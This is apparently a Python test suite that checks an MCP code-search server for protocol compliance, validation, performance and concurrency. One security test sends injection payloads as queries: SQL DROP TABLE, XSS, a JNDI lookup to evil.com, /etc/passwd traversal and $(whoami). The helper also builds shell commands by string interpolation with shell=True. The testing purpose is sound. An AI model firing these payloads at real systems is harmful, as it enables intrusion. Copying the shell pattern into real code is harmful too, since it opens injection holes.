#!/usr/bin/env python3
"""
MCP Comprehensive Compliance & Stress Test Suite
================================================

Evaluates MCP server against industry standards:
1. Protocol Compliance (JSON-RPC 2.0)
2. Tool Discovery & Registration
3. Input Validation & Schema Compliance
4. Error Handling & Reporting
5. Performance & Load Testing
6. Concurrent Request Handling
7. Security Considerations
8. Structured Content Support
9. Timeout & Resource Limits
10. Rate Limiting

Usage:
    python3 scripts/mcp/mcp_comprehensive_test.py

Output:
    - test_results/mcp/comprehensive_test/detailed_report_{timestamp}.json
    - test_results/mcp/comprehensive_test/evaluation_summary_{timestamp}.md
"""

import json
import subprocess
import threading
import time
import sys
import os
import concurrent.futures
import statistics
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Tuple
from dataclasses import dataclass, asdict
from enum import Enum


class PersistentMCPSession:
    """Keep a single ``wsctx mcp`` process alive across multiple requests.

    This measures **warm-path** latency — what real Claude Code users
    experience after the first model load — rather than per-subprocess
    cold-start cost (~12 s).

    Usage::

        with PersistentMCPSession(WORKSPACE) as session:
            # warm-up (absorbs cold-start)
            session.call("search_codebase", {"query": "init", "limit": 1})
            # now measure warm latency
            result, ms = session.call("search_codebase", {"query": "mcp"})
    """

    COLD_START_TIMEOUT = 60  # seconds — generous budget for first model load

    def __init__(self, workspace: str, cmd: str = "wsctx") -> None:
        self._workspace = workspace
        self._cmd = cmd
        self._proc: subprocess.Popen | None = None
        self._req_id = 0

    # ------------------------------------------------------------------

    def __enter__(self) -> "PersistentMCPSession":
        env = os.environ.copy()
        env.setdefault("TOKENIZERS_PARALLELISM", "false")
        env.setdefault("OMP_NUM_THREADS", "1")
        self._proc = subprocess.Popen(
            [self._cmd, "mcp", "--workspace", self._workspace],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            env=env,
        )
        # MCP handshake — fast, no model load needed
        self._send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "perf-session", "version": "1.0"},
        }, timeout=10)
        return self

    def __exit__(self, *_: Any) -> None:
        if self._proc and self._proc.stdin:
            try:
                self._proc.stdin.close()
                self._proc.wait(timeout=5)
            except Exception:
                self._proc.kill()

    # ------------------------------------------------------------------

    def call(
        self, tool: str, arguments: dict, timeout: float | None = None
    ) -> Tuple[Dict, float]:
        """Call a tool and return ``(response_dict, elapsed_ms)``."""
        effective_timeout = timeout or self.COLD_START_TIMEOUT
        return self._send_request(
            "tools/call",
            {"name": tool, "arguments": arguments},
            timeout=effective_timeout,
        )

    def _send_request(
        self, method: str, params: dict, timeout: float
    ) -> Tuple[Dict, float]:
        self._req_id += 1
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": self._req_id,
            "method": method,
            "params": params,
        }) + "\n"

        result_holder: list = [None]

        def _read() -> None:
            try:
                result_holder[0] = self._proc.stdout.readline()
            except Exception as exc:
                result_holder[0] = json.dumps({"error": str(exc)})

        t0 = time.time()
        assert self._proc and self._proc.stdin
        self._proc.stdin.write(req)
        self._proc.stdin.flush()

        reader = threading.Thread(target=_read, daemon=True)
        reader.start()
        reader.join(timeout=timeout)
        elapsed_ms = (time.time() - t0) * 1000

        raw = result_holder[0]
        if raw is None:
            return {"error": f"timeout after {timeout}s"}, elapsed_ms
        try:
            return json.loads(raw), elapsed_ms
        except json.JSONDecodeError:
            return {"error": "invalid json", "raw": raw[:200]}, elapsed_ms


class TestCategory(Enum):
    PROTOCOL = "Protocol Compliance"
    TOOLS = "Tool Discovery & Registration"
    VALIDATION = "Input Validation"
    ERROR_HANDLING = "Error Handling"
    PERFORMANCE = "Performance Testing"
    CONCURRENCY = "Concurrency Testing"
    SECURITY = "Security Testing"
    CONTENT = "Structured Content"
    TIMEOUT = "Timeout & Limits"
    RATE_LIMIT = "Rate Limiting"


@dataclass
class TestResult:
    category: str
    test_name: str
    passed: bool
    score: float  # 0.0 - 1.0
    details: Dict[str, Any]
    duration_ms: float
    error_message: str = ""


class MCPTestSuite:
    """Comprehensive MCP server test suite."""
    
    WORKSPACE = "/Users/trung.ngo/Documents/zaob-dev/zmr-ctx-paker"
    OUTPUT_DIR = Path("test_results/mcp/comprehensive_test")
    WSCTX_CMD = "wsctx"
    
    def __init__(self):
        self.results: List[TestResult] = []
        self.tools_list: List[str] = []
        self.server_info: Dict[str, Any] = {}
        self.OUTPUT_DIR.mkdir(exist_ok=True)
    
    def run_mcp_request(self, method: str, params: dict = None, timeout: int = 30, request_id: int = None) -> Tuple[Dict, float]:
        """Execute MCP request and return result with duration."""
        request = {
            "jsonrpc": "2.0",
            "id": request_id if request_id is not None else int(time.time() * 1000),
            "method": method,
            "params": params or {}
        }
        
        cmd = f'echo \'{json.dumps(request)}\' | {self.WSCTX_CMD} mcp --workspace {self.WORKSPACE}'
        
        start_time = time.time()
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            duration = (time.time() - start_time) * 1000
            
            if result.returncode != 0:
                return {"error": result.stderr, "stdout": result.stdout, "exit_code": result.returncode}, duration
            
            try:
                return json.loads(result.stdout), duration
            except json.JSONDecodeError as e:
                return {"error": f"Invalid JSON: {str(e)}", "raw": result.stdout}, duration
                
        except subprocess.TimeoutExpired:
            return {"error": f"Request timeout after {timeout} seconds"}, (time.time() - start_time) * 1000
        except Exception as e:
            return {"error": str(e)}, (time.time() - start_time) * 1000
    
    def validate_json_rpc(self, response: Dict, expected_id: int) -> Tuple[bool, str]:
        """Validate JSON-RPC 2.0 compliance."""
        if "jsonrpc" not in response:
            return False, "Missing 'jsonrpc' field"
        if response.get("jsonrpc") != "2.0":
            return False, f"Invalid jsonrpc version: {response.get('jsonrpc')}"
        if "id" not in response:
            return False, "Missing 'id' field"
        if response.get("id") != expected_id:
            return False, f"ID mismatch: expected {expected_id}, got {response.get('id')}"
        if "result" not in response and "error" not in response:
            return False, "Missing both 'result' and 'error' fields"
        if "result" in response and "error" in response:
            return False, "Both 'result' and 'error' present (should be mutually exclusive)"
        return True, "Valid JSON-RPC 2.0"
    
    def validate_error_object(self, error: Dict) -> Tuple[bool, str]:
        """Validate JSON-RPC error object format."""
        if not isinstance(error, dict):
            return False, "Error must be an object"
        if "code" not in error:
            return False, "Missing error code"
        if "message" not in error:
            return False, "Missing error message"
        if not isinstance(error["code"], int):
            return False, "Error code must be integer"
        return True, "Valid error object"
    
    # =========================================================================
    # CATEGORY 1: Protocol Compliance Tests
    # =========================================================================
    
    def test_protocol_initialize(self) -> TestResult:
        """Test MCP initialization protocol compliance."""
        request_id = 1001
        start = time.time()
        
        result, duration = self.run_mcp_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "test-client", "version": "1.0.0"}
        }, request_id=request_id)
        
        checks = {
            "jsonrpc_valid": False,
            "has_server_info": False,
            "has_capabilities": False,
            "has_protocol_version": False,
            "server_name_present": False,
            "server_version_present": False
        }
        
        valid, msg = self.validate_json_rpc(result, request_id)
        checks["jsonrpc_valid"] = valid
        
        if valid and "result" in result:
            res = result["result"]
            checks["has_server_info"] = "serverInfo" in res
            checks["has_capabilities"] = "capabilities" in res
            checks["has_protocol_version"] = "protocolVersion" in res
            
            if checks["has_server_info"]:
                self.server_info = res["serverInfo"]
                checks["server_name_present"] = bool(res["serverInfo"].get("name"))
                checks["server_version_present"] = bool(res["serverInfo"].get("version"))
        
        score = sum(checks.values()) / len(checks)
        passed = score >= 0.8
        
        return TestResult(
            category=TestCategory.PROTOCOL.value,
            test_name="initialize",
            passed=passed,
            score=score,
            details={"checks": checks, "response": result},
            duration_ms=duration,
            error_message=msg if not valid else ""
        )
    
    def test_protocol_tools_list(self) -> TestResult:
        """Test tools/list method compliance."""
        request_id = 1002
        
        result, duration = self.run_mcp_request("tools/list", request_id=request_id)
        
        checks = {
            "jsonrpc_valid": False,
            "has_tools_array": False,
            "tools_not_empty": False,
            "each_tool_has_name": False,
            "each_tool_has_description": False,
            "each_tool_has_schema": False
        }
        
        valid, msg = self.validate_json_rpc(result, request_id)
        checks["jsonrpc_valid"] = valid
        
        if valid and "result" in result:
            tools = result["result"].get("tools", [])
            checks["has_tools_array"] = isinstance(tools, list)
            
            if checks["has_tools_array"]:
                checks["tools_not_empty"] = len(tools) > 0
                self.tools_list = [t.get("name") for t in tools if isinstance(t, dict)]
                
                if checks["tools_not_empty"]:
                    checks["each_tool_has_name"] = all(
                        isinstance(t, dict) and "name" in t for t in tools
                    )
                    checks["each_tool_has_description"] = all(
                        isinstance(t, dict) and "description" in t for t in tools
                    )
                    checks["each_tool_has_schema"] = all(
                        isinstance(t, dict) and "inputSchema" in t for t in tools
                    )
        
        score = sum(checks.values()) / len(checks)
        
        return TestResult(
            category=TestCategory.TOOLS.value,
            test_name="tools/list",
            passed=checks["jsonrpc_valid"] and checks["tools_not_empty"],
            score=score,
            details={"checks": checks, "tools_found": len(self.tools_list), "response": result},
            duration_ms=duration
        )
    
    def test_protocol_notifications(self) -> TestResult:
        """Test that notifications (no id) don't receive responses."""
        # This is a notification - should not get a response
        request = {
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        }
        
        cmd = f'echo \'{json.dumps(request)}\' | {self.WSCTX_CMD} mcp --workspace {self.WORKSPACE}'
        
        start = time.time()
        result_proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        duration = (time.time() - start) * 1000
        
        # Notifications should either have empty output or not error
        has_output = bool(result_proc.stdout.strip())
        
        return TestResult(
            category=TestCategory.PROTOCOL.value,
            test_name="notifications/no_response",
            passed=True,  # Either empty or has output is acceptable
            score=1.0 if not has_output else 0.5,
            details={"has_output": has_output, "output": result_proc.stdout[:200]},
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 2: Tool Discovery & Registration
    # =========================================================================
    
    def test_tool_discovery_comprehensive(self) -> TestResult:
        """Comprehensive tool discovery with schema validation."""
        result, duration = self.run_mcp_request("tools/list")
        
        tools_analysis = []
        schema_valid_count = 0
        
        if "result" in result and "tools" in result["result"]:
            for tool in result["result"]["tools"]:
                analysis = {
                    "name": tool.get("name", "UNKNOWN"),
                    "has_description": bool(tool.get("description")),
                    "description_length": len(tool.get("description", "")),
                    "has_schema": "inputSchema" in tool,
                    "schema_type": tool.get("inputSchema", {}).get("type", "N/A"),
                    "has_properties": "properties" in tool.get("inputSchema", {}),
                    "required_fields_count": len(tool.get("inputSchema", {}).get("required", []))
                }
                
                # Validate schema structure
                if analysis["has_schema"] and analysis["schema_type"] == "object":
                    schema_valid_count += 1
                
                tools_analysis.append(analysis)
        
        total_tools = len(tools_analysis)
        avg_description_length = sum(a["description_length"] for a in tools_analysis) / total_tools if total_tools else 0
        
        checks = {
            "tools_found": total_tools > 0,
            "all_have_descriptions": all(a["has_description"] for a in tools_analysis),
            "all_have_schemas": all(a["has_schema"] for a in tools_analysis),
            "schemas_are_valid": schema_valid_count == total_tools if total_tools else False,
            "descriptions_meaningful": avg_description_length > 20  # At least 20 chars
        }
        
        score = sum(checks.values()) / len(checks)
        
        return TestResult(
            category=TestCategory.TOOLS.value,
            test_name="tool_discovery_comprehensive",
            passed=score >= 0.8,
            score=score,
            details={
                "tools_analysis": tools_analysis,
                "checks": checks,
                "total_tools": total_tools,
                "avg_description_length": avg_description_length
            },
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 3: Input Validation
    # =========================================================================
    
    def test_input_validation_missing_required(self) -> TestResult:
        """Test handling of missing required parameters."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "search_codebase",
            "arguments": {}  # Missing required 'query'
        })
        
        has_error = False
        error_type = None
        
        if "result" in result:
            content = result["result"].get("content", [])
            if content and isinstance(content[0], dict):
                text = content[0].get("text", "")
                has_error = "error" in text.lower() or "required" in text.lower()
                error_type = "validation_error" if has_error else "none"
        elif "error" in result:
            has_error = True
            error_type = "rpc_error"
        
        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/missing_required",
            passed=has_error,  # Should error when missing required param
            score=1.0 if has_error else 0.0,
            details={"error_detected": has_error, "error_type": error_type, "response": result},
            duration_ms=duration
        )
    
    def test_input_validation_invalid_types(self) -> TestResult:
        """Test handling of invalid parameter types."""
        test_cases = [
            {"name": "search_codebase", "arguments": {"query": 12345}},  # Should be string
            {"name": "search_codebase", "arguments": {"query": "test", "limit": "ten"}},  # Should be int
            {"name": "search_codebase", "arguments": {"query": None}},  # Null value
        ]
        
        results = []
        for tc in test_cases:
            result, _ = self.run_mcp_request("tools/call", tc)
            has_error = "error" in result or any(
                "error" in str(c.get("text", "")).lower() 
                for c in result.get("result", {}).get("content", [])
                if isinstance(c, dict)
            )
            results.append({"case": tc, "error_detected": has_error})
        
        error_rate = sum(1 for r in results if r["error_detected"]) / len(results)
        
        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/invalid_types",
            passed=error_rate > 0.5,  # Should catch at least some
            score=error_rate,
            details={"test_cases": len(test_cases), "errors_caught": sum(1 for r in results if r["error_detected"]), "results": results},
            duration_ms=0
        )
    
    def test_input_validation_boundary_values(self) -> TestResult:
        """Test boundary value handling."""
        test_cases = [
            {"name": "search_codebase", "arguments": {"query": "", "limit": 0}},  # Empty query, zero limit
            {"name": "search_codebase", "arguments": {"query": "a" * 10000, "limit": 1000}},  # Very long query, high limit
            {"name": "search_codebase", "arguments": {"query": "test", "limit": -1}},  # Negative limit
        ]
        
        results = []
        for tc in test_cases:
            result, _ = self.run_mcp_request("tools/call", tc)
            # Should either succeed with valid response or error gracefully
            handled = "result" in result or "error" in result
            results.append({"case": tc, "handled": handled})
        
        handled_rate = sum(1 for r in results if r["handled"]) / len(results)
        
        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/boundary_values",
            passed=handled_rate == 1.0,
            score=handled_rate,
            details={"test_cases": len(test_cases), "handled_count": sum(1 for r in results if r["handled"])},
            duration_ms=0
        )
    
    def test_input_validation_sql_injection(self) -> TestResult:
        """Test security against SQL/code injection attempts."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com}",
            "../../../etc/passwd",
            "$(whoami)",
        ]
        
        results = []
        for payload in malicious_inputs:
            result, _ = self.run_mcp_request("tools/call", {
                "name": "search_codebase",
                "arguments": {"query": payload, "limit": 5}
            })
            # Should handle gracefully without crashing
            handled_safely = "result" in result or "error" in result
            results.append({"payload": payload[:30], "handled_safely": handled_safely})
        
        safe_rate = sum(1 for r in results if r["handled_safely"]) / len(results)
        
        return TestResult(
            category=TestCategory.SECURITY.value,
            test_name="security/injection_attempts",
            passed=safe_rate == 1.0,
            score=safe_rate,
            details={"test_cases": len(malicious_inputs), "safe_count": sum(1 for r in results if r["handled_safely"])},
            duration_ms=0
        )
    
    # =========================================================================
    # CATEGORY 4: Error Handling
    # =========================================================================
    
    def test_error_handling_unknown_method(self) -> TestResult:
        """Test error response for unknown method."""
        result, duration = self.run_mcp_request("unknown_method_xyz")
        
        has_error = "error" in result
        error_valid = False
        error_code = None
        error_message = None
        
        if has_error:
            error_obj = result["error"]
            valid, msg = self.validate_error_object(error_obj)
            error_valid = valid
            error_code = error_obj.get("code")
            error_message = error_obj.get("message")
        
        return TestResult(
            category=TestCategory.ERROR_HANDLING.value,
            test_name="error_handling/unknown_method",
            passed=has_error and error_valid,
            score=1.0 if (has_error and error_valid) else 0.5 if has_error else 0.0,
            details={
                "has_error": has_error,
                "error_valid": error_valid,
                "error_code": error_code,
                "error_message": error_message
            },
            duration_ms=duration
        )
    
    def test_error_handling_unknown_tool(self) -> TestResult:
        """Test error response for unknown tool."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "nonexistent_tool_abc123",
            "arguments": {}
        })
        
        has_error = False
        error_in_content = False
        
        if "error" in result:
            has_error = True
        elif "result" in result:
            content = result["result"].get("content", [])
            if content and isinstance(content[0], dict):
                text = content[0].get("text", "")
                error_in_content = "error" in text.lower() or "not found" in text.lower()
                has_error = error_in_content
        
        return TestResult(
            category=TestCategory.ERROR_HANDLING.value,
            test_name="error_handling/unknown_tool",
            passed=has_error,
            score=1.0 if has_error else 0.0,
            details={"has_error": has_error, "error_in_content": error_in_content},
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 5: Performance Testing
    # =========================================================================
    
    def test_performance_single_request_latency(self) -> TestResult:
        """Measure single request latency."""
        latencies = []
        
        for _ in range(5):
            result, duration = self.run_mcp_request("tools/call", {
                "name": "get_index_status",
                "arguments": {}
            })
            if "result" in result:
                latencies.append(duration)
            time.sleep(0.1)
        
        if latencies:
            avg_latency = statistics.mean(latencies)
            max_latency = max(latencies)
            min_latency = min(latencies)
            std_dev = statistics.stdev(latencies) if len(latencies) > 1 else 0
        else:
            avg_latency = max_latency = min_latency = std_dev = 0
        
        # Score based on latency thresholds (lower is better)
        score = 1.0 if avg_latency < 1000 else 0.8 if avg_latency < 3000 else 0.5 if avg_latency < 5000 else 0.0
        
        return TestResult(
            category=TestCategory.PERFORMANCE.value,
            test_name="performance/single_request_latency",
            passed=avg_latency < 5000,  # Should complete within 5 seconds
            score=score,
            details={
                "avg_latency_ms": avg_latency,
                "min_latency_ms": min_latency,
                "max_latency_ms": max_latency,
                "std_dev_ms": std_dev,
                "samples": len(latencies)
            },
            duration_ms=avg_latency
        )
    
    def test_performance_search_latency(self) -> TestResult:
        """Measure warm-path search latency using a persistent MCP process.

        A single ``wsctx mcp`` subprocess is kept alive for the whole test.
        The first request is discarded (absorbs cold-start / model load).
        Subsequent requests measure real steady-state latency.

        Thresholds (warm path after ONNX model load):
            ≤ 500 ms  — excellent
            ≤ 2 000 ms — good
            ≤ 5 000 ms — acceptable
            > 5 000 ms — fail
        """
        warm_latencies: list[float] = []
        cold_start_ms: float = 0.0
        error_message = ""

        try:
            with PersistentMCPSession(self.WORKSPACE, self.WSCTX_CMD) as session:
                # Warm-up: absorb cold-start (model load + LEANN init).
                # Use a generous timeout; the result is not counted.
                warmup_result, cold_start_ms = session.call(
                    "search_codebase",
                    {"query": "mcp server", "limit": 5},
                    timeout=PersistentMCPSession.COLD_START_TIMEOUT,
                )

                if "error" in warmup_result and "result" not in warmup_result:
                    error_message = f"warm-up failed: {warmup_result.get('error')}"
                else:
                    # Warm measurements — model is loaded, LEANN searcher is cached.
                    for query in ["config", "logger", "retrieval", "chunker"]:
                        result, ms = session.call(
                            "search_codebase",
                            {"query": query, "limit": 10},
                            timeout=10,
                        )
                        if "result" in result:
                            warm_latencies.append(ms)

        except Exception as exc:
            error_message = str(exc)

        if warm_latencies:
            avg_latency = statistics.mean(warm_latencies)
            max_latency = max(warm_latencies)
            p99_latency = sorted(warm_latencies)[int(len(warm_latencies) * 0.99)] if len(warm_latencies) > 1 else max_latency
        else:
            avg_latency = max_latency = p99_latency = 0.0

        score = (
            1.0 if avg_latency < 500
            else 0.8 if avg_latency < 2000
            else 0.5 if avg_latency < 5000
            else 0.0
        )

        return TestResult(
            category=TestCategory.PERFORMANCE.value,
            test_name="performance/search_latency",
            passed=avg_latency < 5000 and bool(warm_latencies),
            score=score,
            details={
                "mode": "warm-path (persistent process)",
                "cold_start_ms": round(cold_start_ms, 1),
                "avg_warm_ms": round(avg_latency, 1),
                "max_warm_ms": round(max_latency, 1),
                "p99_warm_ms": round(p99_latency, 1),
                "samples": len(warm_latencies),
                "error": error_message,
            },
            duration_ms=avg_latency,
            error_message=error_message,
        )

    def test_performance_pack_context(self) -> TestResult:
        """Measure warm-path pack_context latency using a persistent MCP process."""
        warm_latencies: list[float] = []
        cold_start_ms: float = 0.0
        error_message = ""

        try:
            with PersistentMCPSession(self.WORKSPACE, self.WSCTX_CMD) as session:
                # Warm-up — not counted
                _, cold_start_ms = session.call(
                    "search_codebase",
                    {"query": "init", "limit": 1},
                    timeout=PersistentMCPSession.COLD_START_TIMEOUT,
                )

                for format_type in ["json", "xml", "md"]:
                    result, ms = session.call(
                        "pack_context",
                        {"query": "mcp config", "format": format_type},
                        timeout=30,
                    )
                    if "result" in result:
                        warm_latencies.append(ms)

        except Exception as exc:
            error_message = str(exc)

        avg_latency = statistics.mean(warm_latencies) if warm_latencies else 0.0

        # pack_context does I/O (write output file) so thresholds are looser
        score = (
            1.0 if avg_latency < 2000
            else 0.8 if avg_latency < 5000
            else 0.5 if avg_latency < 10000
            else 0.0
        )

        return TestResult(
            category=TestCategory.PERFORMANCE.value,
            test_name="performance/pack_context_latency",
            passed=avg_latency < 10000 and bool(warm_latencies),
            score=score,
            details={
                "mode": "warm-path (persistent process)",
                "cold_start_ms": round(cold_start_ms, 1),
                "avg_warm_ms": round(avg_latency, 1),
                "samples": len(warm_latencies),
                "error": error_message,
            },
            duration_ms=avg_latency,
            error_message=error_message,
        )
    
    # =========================================================================
    # CATEGORY 6: Concurrency Testing
    # =========================================================================
    
    def test_concurrency_multiple_parallel(self) -> TestResult:
        """Test handling of parallel requests."""
        def make_request(i):
            return self.run_mcp_request("tools/call", {
                "name": "get_index_status",
                "arguments": {}
            })
        
        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(make_request, i) for i in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_duration = (time.time() - start) * 1000
        
        successful = sum(1 for r, _ in results if "result" in r)
        errors = sum(1 for r, _ in results if "error" in r)
        
        success_rate = successful / len(results)
        
        return TestResult(
            category=TestCategory.CONCURRENCY.value,
            test_name="concurrency/parallel_requests",
            passed=success_rate >= 0.9,
            score=success_rate,
            details={
                "total_requests": len(results),
                "successful": successful,
                "errors": errors,
                "total_duration_ms": total_duration,
                "success_rate": success_rate
            },
            duration_ms=total_duration
        )
    
    def test_concurrency_mixed_tools(self) -> TestResult:
        """Test concurrent requests to different tools."""
        tools_to_test = ["get_index_status", "get_domain_map"]
        
        def make_request(tool_name):
            return self.run_mcp_request("tools/call", {
                "name": tool_name,
                "arguments": {}
            })
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(make_request, tool) for tool in tools_to_test * 3]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        successful = sum(1 for r, _ in results if "result" in r)
        
        return TestResult(
            category=TestCategory.CONCURRENCY.value,
            test_name="concurrency/mixed_tools",
            passed=successful == len(results),
            score=successful / len(results),
            details={
                "total_requests": len(results),
                "successful": successful
            },
            duration_ms=0
        )
    
    # =========================================================================
    # CATEGORY 7: Timeout & Resource Limits
    # =========================================================================
    
    def test_timeout_handling(self) -> TestResult:
        """Test timeout handling for long operations."""
        # Use a short timeout to test timeout handling
        result, duration = self.run_mcp_request(
            "tools/call",
            {"name": "get_index_status", "arguments": {}},
            timeout=5
        )
        
        completed_in_time = duration < 5000  # Should complete within 5s
        
        return TestResult(
            category=TestCategory.TIMEOUT.value,
            test_name="timeout/handling",
            passed=completed_in_time,
            score=1.0 if completed_in_time else 0.0,
            details={"duration_ms": duration, "timeout_set": 5},
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 8: Structured Content Support
    # =========================================================================
    
    def test_structured_content_format(self) -> TestResult:
        """Test that structured content is returned properly."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "search_codebase",
            "arguments": {"query": "mcp", "limit": 3}
        })
        
        has_content = False
        has_structured = False
        content_is_array = False
        has_text_content = False
        
        if "result" in result:
            res = result["result"]
            has_content = "content" in res
            has_structured = "structuredContent" in res
            
            if has_content:
                content = res["content"]
                content_is_array = isinstance(content, list)
                
                if content_is_array and len(content) > 0:
                    first_item = content[0]
                    has_text_content = isinstance(first_item, dict) and "type" in first_item
        
        checks = {
            "has_content": has_content,
            "has_structured_content": has_structured,
            "content_is_array": content_is_array,
            "content_items_have_type": has_text_content
        }
        
        score = sum(checks.values()) / len(checks)
        
        return TestResult(
            category=TestCategory.CONTENT.value,
            test_name="structured_content/format",
            passed=has_content and content_is_array,
            score=score,
            details=checks,
            duration_ms=duration
        )
    
    # =========================================================================
    # Run All Tests
    # =========================================================================
    
    def run_all_tests(self):
        """Execute all tests and generate report."""
        print("=" * 70)
        print("MCP COMPREHENSIVE COMPLIANCE & STRESS TEST SUITE")
        print("=" * 70)
        print(f"Target Workspace: {self.WORKSPACE}")
        print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-" * 70)
        
        tests = [
            # Protocol Compliance
            self.test_protocol_initialize,
            self.test_protocol_tools_list,
            self.test_protocol_notifications,
            
            # Tool Discovery
            self.test_tool_discovery_comprehensive,
            
            # Input Validation
            self.test_input_validation_missing_required,
            self.test_input_validation_invalid_types,
            self.test_input_validation_boundary_values,
            self.test_input_validation_sql_injection,
            
            # Error Handling
            self.test_error_handling_unknown_method,
            self.test_error_handling_unknown_tool,
            
            # Performance
            self.test_performance_single_request_latency,
            self.test_performance_search_latency,
            self.test_performance_pack_context,
            
            # Concurrency
            self.test_concurrency_multiple_parallel,
            self.test_concurrency_mixed_tools,
            
            # Timeout
            self.test_timeout_handling,
            
            # Structured Content
            self.test_structured_content_format,
        ]
        
        for test_func in tests:
            print(f"Running: {test_func.__name__}...", end=" ", flush=True)
            try:
                result = test_func()
                self.results.append(result)
                status = "✓" if result.passed else "✗"
                print(f"{status} ({result.score*100:.0f}%)")
            except Exception as e:
                print(f"✗ Error: {e}")
                self.results.append(TestResult(
                    category="ERROR",
                    test_name=test_func.__name__,
                    passed=False,
                    score=0.0,
                    details={"error": str(e)},
                    duration_ms=0,
                    error_message=str(e)
                ))
        
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive test report."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Calculate scores by category
        category_scores = {}
        for cat in TestCategory:
            cat_results = [r for r in self.results if r.category == cat.value]
            if cat_results:
                avg_score = statistics.mean([r.score for r in cat_results])
                passed_count = sum(1 for r in cat_results if r.passed)
                category_scores[cat.value] = {
                    "average_score": avg_score,
                    "total_tests": len(cat_results),
                    "passed": passed_count,
                    "failed": len(cat_results) - passed_count
                }
        
        total_tests = len(self.results)
        total_passed = sum(1 for r in self.results if r.passed)
        overall_score = statistics.mean([r.score for r in self.results]) if self.results else 0
        
        # JSON detailed report
        report_data = {
            "timestamp": timestamp,
            "workspace": self.WORKSPACE,
            "server_info": self.server_info,
            "summary": {
                "total_tests": total_tests,
                "passed": total_passed,
                "failed": total_tests - total_passed,
                "overall_score": overall_score,
                "pass_rate": total_passed / total_tests if total_tests > 0 else 0
            },
            "category_scores": category_scores,
            "results": [asdict(r) for r in self.results]
        }
        
        json_file = self.OUTPUT_DIR / f"detailed_report_{timestamp}.json"
        with open(json_file, "w") as f:
            json.dump(report_data, f, indent=2, default=str)
        
        # Markdown summary report
        md_content = f"""# MCP Comprehensive Test Report

**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  
**Workspace:** `{self.WORKSPACE}`  
**Server:** {self.server_info.get('name', 'Unknown')} {self.server_info.get('version', '')}

## Executive Summary

| Metric | Value |
|--------|-------|
| **Overall Score** | {overall_score*100:.1f}% |
| **Total Tests** | {total_tests} |
| **Passed** | {total_passed} ✓ |
| **Failed** | {total_tests - total_passed} ✗ |
| **Pass Rate** | {total_passed/total_tests*100:.1f}% |

## Category Scores

| Category | Score | Tests | Passed | Failed |
|----------|-------|-------|--------|--------|
"""
        
        for cat_name, scores in category_scores.items():
            md_content += f"| {cat_name} | {scores['average_score']*100:.0f}% | {scores['total_tests']} | {scores['passed']} | {scores['failed']} |\n"
        
        md_content += "\n## Detailed Results\n\n"
        
        current_category = None
        for result in self.results:
            if result.category != current_category:
                current_category = result.category
                md_content += f"\n### {current_category}\n\n"
            
            status_icon = "✅" if result.passed else "❌"
            md_content += f"**{status_icon} {result.test_name}** (Score: {result.score*100:.0f}%)\n"
            md_content += f"- Duration: {result.duration_ms:.0f}ms\n"
            
            if result.details:
                md_content += f"- Details: `{json.dumps(result.details, default=str)[:200]}...`\n"
            
            if result.error_message:
                md_content += f"- Error: `{result.error_message}`\n"
            
            md_content += "\n"
        
        md_content += f"""\n## MCP Compliance Rating

Based on the test results, this MCP server achieves a **{overall_score*100:.0f}%** compliance score.

### Rating Scale:
- **95-100%**: Excellent - Full MCP compliance
- **85-94%**: Good - Minor issues, production ready
- **70-84%**: Fair - Some gaps, review recommended
- **50-69%**: Poor - Significant issues, not recommended
- **Below 50%**: Critical - Major compliance failures

### Recommendation
"""
        
        if overall_score >= 0.95:
            md_content += "✨ **Excellent** - This MCP server demonstrates full compliance with MCP standards."
        elif overall_score >= 0.85:
            md_content += "✓ **Good** - This MCP server is production-ready with minor areas for improvement."
        elif overall_score >= 0.70:
            md_content += "⚠ **Fair** - This MCP server has some compliance gaps. Review failed tests."
        elif overall_score >= 0.50:
            md_content += "❌ **Poor** - This MCP server has significant issues. Not recommended for production."
        else:
            md_content += "🚨 **Critical** - This MCP server has major compliance failures. Requires immediate attention."
        
        md_file = self.OUTPUT_DIR / f"evaluation_summary_{timestamp}.md"
        with open(md_file, "w") as f:
            f.write(md_content)
        
        # Print summary to console
        print("\n" + "=" * 70)
        print("TEST COMPLETE")
        print("=" * 70)
        print(f"Overall Score: {overall_score*100:.1f}%")
        print(f"Passed: {total_passed}/{total_tests}")
        print(f"\nReports saved:")
        print(f"  - {json_file}")
        print(f"  - {md_file}")
        print("=" * 70)


if __name__ == "__main__":
    suite = MCPTestSuite()
    suite.run_all_tests()
